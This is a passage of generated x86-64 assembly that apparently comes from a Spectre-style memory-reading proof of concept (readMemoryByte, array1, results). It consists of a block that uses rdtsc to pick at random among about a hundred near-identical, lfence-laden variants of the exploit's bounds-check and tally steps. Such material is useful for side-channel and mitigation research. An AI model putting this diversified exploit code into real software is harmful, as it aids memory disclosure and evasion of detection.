	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 63
.LreadMemoryByte_win7_var63:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 64
.LreadMemoryByte_win7_var64:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 65
.LreadMemoryByte_win7_var65:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 66
.LreadMemoryByte_win7_var66:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 67
.LreadMemoryByte_win7_var67:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 68
.LreadMemoryByte_win7_var68:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 69
.LreadMemoryByte_win7_var69:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 70
.LreadMemoryByte_win7_var70:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 71
.LreadMemoryByte_win7_var71:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 72
.LreadMemoryByte_win7_var72:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 73
.LreadMemoryByte_win7_var73:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 74
.LreadMemoryByte_win7_var74:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 75
.LreadMemoryByte_win7_var75:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 76
.LreadMemoryByte_win7_var76:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 77
.LreadMemoryByte_win7_var77:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 78
.LreadMemoryByte_win7_var78:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 79
.LreadMemoryByte_win7_var79:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 80
.LreadMemoryByte_win7_var80:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 81
.LreadMemoryByte_win7_var81:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 82
.LreadMemoryByte_win7_var82:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 83
.LreadMemoryByte_win7_var83:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 84
.LreadMemoryByte_win7_var84:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 85
.LreadMemoryByte_win7_var85:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 86
.LreadMemoryByte_win7_var86:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 87
.LreadMemoryByte_win7_var87:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 88
.LreadMemoryByte_win7_var88:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 89
.LreadMemoryByte_win7_var89:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 90
.LreadMemoryByte_win7_var90:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 91
.LreadMemoryByte_win7_var91:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 92
.LreadMemoryByte_win7_var92:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 93
.LreadMemoryByte_win7_var93:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 94
.LreadMemoryByte_win7_var94:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 95
.LreadMemoryByte_win7_var95:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 96
.LreadMemoryByte_win7_var96:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 97
.LreadMemoryByte_win7_var97:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 98
.LreadMemoryByte_win7_var98:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 99
.LreadMemoryByte_win7_var99:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
.LreadMemoryByte_win7_continue:
	addq	$32, %rsp
	movl	$0, %edx
	divl	%ecx
	movl	%edx, %eax
	movl	%eax, %edx
	leaq	array1(%rip), %rax
	movzbl	(%rdx,%rax), %eax
	movzbl	%al, %eax
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win6_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win6_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win6_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win6_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win6_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win6_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win6_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win6_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win6_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win6_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win6_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win6_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win6_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win6_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win6_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win6_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win6_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win6_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win6_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win6_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win6_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win6_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win6_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win6_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win6_var24
	cmpl	$25, %eax
	je	.LreadMemoryByte_win6_var25
	cmpl	$26, %eax
	je	.LreadMemoryByte_win6_var26
	cmpl	$27, %eax
	je	.LreadMemoryByte_win6_var27
	cmpl	$28, %eax
	je	.LreadMemoryByte_win6_var28
	cmpl	$29, %eax
	je	.LreadMemoryByte_win6_var29
	cmpl	$30, %eax
	je	.LreadMemoryByte_win6_var30
	cmpl	$31, %eax
	je	.LreadMemoryByte_win6_var31
	cmpl	$32, %eax
	je	.LreadMemoryByte_win6_var32
	cmpl	$33, %eax
	je	.LreadMemoryByte_win6_var33
	cmpl	$34, %eax
	je	.LreadMemoryByte_win6_var34
	cmpl	$35, %eax
	je	.LreadMemoryByte_win6_var35
	cmpl	$36, %eax
	je	.LreadMemoryByte_win6_var36
	cmpl	$37, %eax
	je	.LreadMemoryByte_win6_var37
	cmpl	$38, %eax
	je	.LreadMemoryByte_win6_var38
	cmpl	$39, %eax
	je	.LreadMemoryByte_win6_var39
	cmpl	$40, %eax
	je	.LreadMemoryByte_win6_var40
	cmpl	$41, %eax
	je	.LreadMemoryByte_win6_var41
	cmpl	$42, %eax
	je	.LreadMemoryByte_win6_var42
	cmpl	$43, %eax
	je	.LreadMemoryByte_win6_var43
	cmpl	$44, %eax
	je	.LreadMemoryByte_win6_var44
	cmpl	$45, %eax
	je	.LreadMemoryByte_win6_var45
	cmpl	$46, %eax
	je	.LreadMemoryByte_win6_var46
	cmpl	$47, %eax
	je	.LreadMemoryByte_win6_var47
	cmpl	$48, %eax
	je	.LreadMemoryByte_win6_var48
	cmpl	$49, %eax
	je	.LreadMemoryByte_win6_var49
	cmpl	$50, %eax
	je	.LreadMemoryByte_win6_var50
	cmpl	$51, %eax
	je	.LreadMemoryByte_win6_var51
	cmpl	$52, %eax
	je	.LreadMemoryByte_win6_var52
	cmpl	$53, %eax
	je	.LreadMemoryByte_win6_var53
	cmpl	$54, %eax
	je	.LreadMemoryByte_win6_var54
	cmpl	$55, %eax
	je	.LreadMemoryByte_win6_var55
	cmpl	$56, %eax
	je	.LreadMemoryByte_win6_var56
	cmpl	$57, %eax
	je	.LreadMemoryByte_win6_var57
	cmpl	$58, %eax
	je	.LreadMemoryByte_win6_var58
	cmpl	$59, %eax
	je	.LreadMemoryByte_win6_var59
	cmpl	$60, %eax
	je	.LreadMemoryByte_win6_var60
	cmpl	$61, %eax
	je	.LreadMemoryByte_win6_var61
	cmpl	$62, %eax
	je	.LreadMemoryByte_win6_var62
	cmpl	$63, %eax
	je	.LreadMemoryByte_win6_var63
	cmpl	$64, %eax
	je	.LreadMemoryByte_win6_var64
	cmpl	$65, %eax
	je	.LreadMemoryByte_win6_var65
	cmpl	$66, %eax
	je	.LreadMemoryByte_win6_var66
	cmpl	$67, %eax
	je	.LreadMemoryByte_win6_var67
	cmpl	$68, %eax
	je	.LreadMemoryByte_win6_var68
	cmpl	$69, %eax
	je	.LreadMemoryByte_win6_var69
	cmpl	$70, %eax
	je	.LreadMemoryByte_win6_var70
	cmpl	$71, %eax
	je	.LreadMemoryByte_win6_var71
	cmpl	$72, %eax
	je	.LreadMemoryByte_win6_var72
	cmpl	$73, %eax
	je	.LreadMemoryByte_win6_var73
	cmpl	$74, %eax
	je	.LreadMemoryByte_win6_var74
	cmpl	$75, %eax
	je	.LreadMemoryByte_win6_var75
	cmpl	$76, %eax
	je	.LreadMemoryByte_win6_var76
	cmpl	$77, %eax
	je	.LreadMemoryByte_win6_var77
	cmpl	$78, %eax
	je	.LreadMemoryByte_win6_var78
	cmpl	$79, %eax
	je	.LreadMemoryByte_win6_var79
	cmpl	$80, %eax
	je	.LreadMemoryByte_win6_var80
	cmpl	$81, %eax
	je	.LreadMemoryByte_win6_var81
	cmpl	$82, %eax
	je	.LreadMemoryByte_win6_var82
	cmpl	$83, %eax
	je	.LreadMemoryByte_win6_var83
	cmpl	$84, %eax
	je	.LreadMemoryByte_win6_var84
	cmpl	$85, %eax
	je	.LreadMemoryByte_win6_var85
	cmpl	$86, %eax
	je	.LreadMemoryByte_win6_var86
	cmpl	$87, %eax
	je	.LreadMemoryByte_win6_var87
	cmpl	$88, %eax
	je	.LreadMemoryByte_win6_var88
	cmpl	$89, %eax
	je	.LreadMemoryByte_win6_var89
	cmpl	$90, %eax
	je	.LreadMemoryByte_win6_var90
	cmpl	$91, %eax
	je	.LreadMemoryByte_win6_var91
	cmpl	$92, %eax
	je	.LreadMemoryByte_win6_var92
	cmpl	$93, %eax
	je	.LreadMemoryByte_win6_var93
	cmpl	$94, %eax
	je	.LreadMemoryByte_win6_var94
	cmpl	$95, %eax
	je	.LreadMemoryByte_win6_var95
	cmpl	$96, %eax
	je	.LreadMemoryByte_win6_var96
	cmpl	$97, %eax
	je	.LreadMemoryByte_win6_var97
	cmpl	$98, %eax
	je	.LreadMemoryByte_win6_var98
	cmpl	$99, %eax
	je	.LreadMemoryByte_win6_var99
	jmp	.LreadMemoryByte_win6_var0
## Variant 0
.LreadMemoryByte_win6_var0:
	popq	%rax
	cmpl	%eax, -84(%rbp)
	je	.L17
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 1
.LreadMemoryByte_win6_var1:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 2
.LreadMemoryByte_win6_var2:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 3
.LreadMemoryByte_win6_var3:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 4
.LreadMemoryByte_win6_var4:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 5
.LreadMemoryByte_win6_var5:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 6
.LreadMemoryByte_win6_var6:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 7
.LreadMemoryByte_win6_var7:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 8
.LreadMemoryByte_win6_var8:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 9
.LreadMemoryByte_win6_var9:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 10
.LreadMemoryByte_win6_var10:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 11
.LreadMemoryByte_win6_var11:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 12
.LreadMemoryByte_win6_var12:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 13
.LreadMemoryByte_win6_var13:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 14
.LreadMemoryByte_win6_var14:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 15
.LreadMemoryByte_win6_var15:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 16
.LreadMemoryByte_win6_var16:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 17
.LreadMemoryByte_win6_var17:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 18
.LreadMemoryByte_win6_var18:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 19
.LreadMemoryByte_win6_var19:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 20
.LreadMemoryByte_win6_var20:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 21
.LreadMemoryByte_win6_var21:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 22
.LreadMemoryByte_win6_var22:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 23
.LreadMemoryByte_win6_var23:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 24
.LreadMemoryByte_win6_var24:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 25
.LreadMemoryByte_win6_var25:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 26
.LreadMemoryByte_win6_var26:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 27
.LreadMemoryByte_win6_var27:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 28
.LreadMemoryByte_win6_var28:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 29
.LreadMemoryByte_win6_var29:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 30
.LreadMemoryByte_win6_var30:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 31
.LreadMemoryByte_win6_var31:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 32
.LreadMemoryByte_win6_var32:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 33
.LreadMemoryByte_win6_var33:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 34
.LreadMemoryByte_win6_var34:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 35
.LreadMemoryByte_win6_var35:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 36
.LreadMemoryByte_win6_var36:
	popq	%rax
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
